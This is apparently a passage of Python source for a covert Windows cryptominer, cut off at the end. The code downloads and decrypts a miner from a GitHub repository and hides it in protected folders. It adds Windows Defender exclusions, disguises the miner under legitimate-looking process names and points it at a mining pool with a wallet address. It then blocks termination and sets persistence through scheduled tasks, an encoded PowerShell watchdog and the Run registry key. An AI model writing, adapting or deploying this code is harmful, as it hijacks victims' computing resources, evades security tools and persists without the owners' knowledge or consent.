def create_secure_hidden_dir():
    chars = string.ascii_letters + string.digits
    folder_name = ''.join(random.choices(chars, k=17))
    base = os.environ.get('ProgramData', 'C:\\ProgramData')
    full_path = os.path.join(base, folder_name)
    os.makedirs(full_path, exist_ok=True)
    ctypes.windll.kernel32.SetFileAttributesW(full_path, 0x06)
    subprocess.run(f'icacls "{full_path}" /inheritance:r /grant:r "SYSTEM:(OI)(CI)F" "Administrators:(OI)(CI)F"',
                   shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
    return full_path

def aes_decrypt_file(encrypted_data, key):
    try:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        aesgcm = AESGCM(key)
        nonce = encrypted_data[:12]
        ct = encrypted_data[12:]
        return aesgcm.decrypt(nonce, ct, None)
    except Exception as e:
        hawk.error(f"AES decrypt failed: {e}")
        return None

def find_file_url(prefix):
    """Search the repository for a file whose name starts with `prefix`."""
    hawk.debug(f"[REPO] searching for file with prefix '{prefix}'")
    try:
        req = urllib.request.Request(REPO_API, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=10) as resp:
            data = json.loads(resp.read().decode())
        for item in data:
            if item['name'].startswith(prefix):
                raw_url = f"https://raw.githubusercontent.com/ivanban789/bom/{BRANCH}/{item['name']}"
                hawk.debug(f"[REPO] found file: {item['name']} -> {raw_url}")
                return raw_url
        hawk.error(f"[REPO] no file found with prefix '{prefix}'")
        return None
    except Exception as e:
        hawk.error(f"[REPO] failed to search repository: {e}")
        return None

def download_and_prepare():
    hawk.info("[DOWNLOAD] start")
    miner_url = find_file_url(MINER_FILE_PREFIX)
    if not miner_url:
        return None, None

    try:
        hawk.debug(f"[DOWNLOAD] fetching encrypted miner zip from {miner_url}")
        urllib.request.urlretrieve(miner_url, os.path.join(tempfile.gettempdir(), "miner.zip.enc"))
    except Exception as e:
        hawk.error(f"[DOWNLOAD] Failed to download miner zip: {e}")
        return None, None

    with open(os.path.join(tempfile.gettempdir(), "miner.zip.enc"), 'rb') as f:
        encrypted_miner = f.read()
    decrypted_zip = aes_decrypt_file(encrypted_miner, MINER_ENC_KEY)
    if not decrypted_zip:
        hawk.error("[DOWNLOAD] Decryption of miner zip failed")
        return None, None

    temp_dir = tempfile.mkdtemp()
    zip_path = os.path.join(temp_dir, "miner.zip")
    try:
        with open(zip_path, 'wb') as f:
            f.write(decrypted_zip)
        hawk.debug("[DOWNLOAD] extracting decrypted miner zip")
        with zipfile.ZipFile(zip_path, 'r') as zf:
            zf.extractall(temp_dir)

        src_exe = None
        src_config = None
        for root, dirs, files in os.walk(temp_dir):
            for f in files:
                if f.lower() == MINER_EXE_NAME.lower():
                    src_exe = os.path.join(root, f)
                elif f.lower() == "config.json":
                    src_config = os.path.join(root, f)

        if src_exe:
            install_dir = create_secure_hidden_dir()
            FILE_ATTRIBUTE_HIDDEN = 0x02
            add_folder_to_defender_exclusions(install_dir)

            exe_names = [name for name in LEGIT_NAMES if name.lower().endswith('.exe')]
            if not exe_names:
                exe_names = ["RuntimeBroker.exe"]

            running_procs = set()
            try:
                tasklist_out = subprocess.run(
                    'tasklist /fo csv /nh', capture_output=True, text=True,
                    shell=True, timeout=10, creationflags=subprocess.CREATE_NO_WINDOW
                ).stdout.lower()
                for line in tasklist_out.splitlines():
                    parts = line.split('","')
                    if parts:
                        img = parts[0].strip('"').lower()
                        if img:
                            running_procs.add(img)
            except:
                pass
            available_names = [n for n in exe_names if n.lower() not in running_procs]
            if not available_names:
                available_names = exe_names
            new_name = random.choice(available_names)
            dest_exe = os.path.join(install_dir, new_name)
            shutil.copy2(src_exe, dest_exe)
            hawk.debug(f"[DOWNLOAD] exe placed as {new_name} at {dest_exe}")

            config_dir = os.path.join(os.environ['APPDATA'], "Microsoft", "Windows", "Themes", "CachedFiles")
            os.makedirs(config_dir, exist_ok=True)
            ctypes.windll.kernel32.SetFileAttributesW(config_dir, FILE_ATTRIBUTE_HIDDEN)
            add_folder_to_defender_exclusions(config_dir)

            if src_config:
                dest_config = os.path.join(config_dir, "config.json")
                shutil.copy2(src_config, dest_config)
                hawk.debug(f"[DOWNLOAD] config.json placed at {dest_config}")
            else:
                hawk.warning("[DOWNLOAD] config.json not found, will generate")
            return dest_exe, config_dir
        else:
            hawk.error("[DOWNLOAD] miner exe not found in decrypted zip")
            return None, None

    except Exception as e:
        hawk.error(f"[DOWNLOAD] failed: {e}", exc_info=True)
        return None, None
    finally:
        try:
            shutil.rmtree(temp_dir)
        except:
            pass

def generate_config(config_dir, threads=None):
    hawk.info("[CONFIG] generating config.json")
    if threads is None:
        cpu_count = os.cpu_count() or 4
        min_threads = max(1, int(cpu_count * 0.15))
        max_threads = max(1, int(cpu_count * 0.30))
        threads = random.randint(min_threads, max_threads)
    hawk.debug(f"[CONFIG] using {threads} threads")
    config = {
        "autosave": True,
        "cpu": {
            "enabled": True,
            "max-threads-hint": threads,
            "priority": 1
        },
        "pools": [
            {
                "url": "p2pool.io:3333",
                "user": WALLET_ADDRESS,
                "pass": "x",
                "keepalive": True,
                "tls": False
            }
        ]
    }
    config_path = os.path.join(config_dir, "config.json")
    try:
        with open(config_path, 'w') as cf:
            json.dump(config, cf, indent=2)
        hawk.info(f"[CONFIG] written to {config_path}")
    except Exception as e:
        hawk.error(f"[CONFIG] write failed: {e}", exc_info=True)

def protect_process(pid):
    try:
        import win32security, win32api, win32process
    except ImportError:
        hawk.warning("[PROCESS_PROTECT] pywin32 not installed, skipping ACL protection")
        return
    try:
        hProcess = win32api.OpenProcess(win32process.PROCESS_SET_SECURITY, False, pid)
        admins, _, _ = win32security.LookupAccountName("", "Administrators")
        system, _, _ = win32security.LookupAccountName("", "SYSTEM")
        dacl = win32security.ACL()
        dacl.AddAccessAllowedAce(win32security.ACL_REVISION, win32process.PROCESS_TERMINATE, admins)
        dacl.AddAccessAllowedAce(win32security.ACL_REVISION, win32process.PROCESS_TERMINATE, system)
        win32security.SetSecurityInfo(hProcess, win32security.SE_KERNEL_OBJECT,
                                      win32security.DACL_SECURITY_INFORMATION,
                                      None, None, dacl, None)
        hawk.info("[PROCESS_PROTECT] only admins/system can terminate miner")
    except Exception as e:
        hawk.error(f"[PROCESS_PROTECT] failed: {e}")

def start_miner(exe_path, config_dir):
    hawk.info(f"[MINER] launching {exe_path}")
    try:
        proc = subprocess.Popen(
            [exe_path, f"--config={os.path.join(config_dir, 'config.json')}"],
            creationflags=subprocess.CREATE_NO_WINDOW,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT
        )
        protect_process(proc.pid)
        hawk.info(f"[MINER] PID {proc.pid}")
        return proc
    except Exception as e:
        hawk.error(f"[MINER] failed to start: {e}", exc_info=True)
        return None

def create_scheduled_task(exe_path, config_dir):
    if not ENABLE_PERSISTENCE:
        hawk.info("[PERSISTENCE] disabled")
        return
    hawk.info("[PERSISTENCE] creating logon scheduled task for miner")
    try:
        task_name = "WindowsHelperTask"
        config_path = os.path.join(config_dir, 'config.json')
        subprocess.run([
            'schtasks', '/create', '/tn', task_name,
            '/tr', f'"{exe_path}" --config="{config_path}"',
            '/sc', 'onlogon', '/rl', 'HIGHEST', '/f'
        ], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        hawk.info("[PERSISTENCE] logon task created")
    except Exception as e:
        hawk.error(f"[PERSISTENCE] logon task failed: {e}", exc_info=True)

    hawk.info("[PERSISTENCE] creating watchdog scheduled task (runs every 5 minutes)")
    try:
        task_name_watchdog = "WindowsHelperWatchdog"
        config_path = os.path.join(config_dir, 'config.json')
        ps_script = f'''$path = "{exe_path}"; $running = Get-Process | Where-Object {{ $_.Path -eq $path }}; if (-not $running) {{ Start-Process -FilePath $path -ArgumentList "--config={config_path}" -WindowStyle Hidden }}'''
        b64 = base64.b64encode(ps_script.encode('utf-16le')).decode()
        subprocess.run([
            'schtasks', '/create', '/tn', task_name_watchdog,
            '/tr', f'powershell -EncodedCommand {b64}',
            '/sc', 'minute', '/mo', '5', '/rl', 'HIGHEST', '/f'
        ], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        hawk.info("[PERSISTENCE] watchdog task created")
    except Exception as e:
        hawk.error(f"[PERSISTENCE] watchdog task failed: {e}", exc_info=True)

def add_persistence_multi(exe_path, config_dir):
    config_path = os.path.join(config_dir, 'config.json')
    target = f'"{exe_path}" --config="{config_path}"'

    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
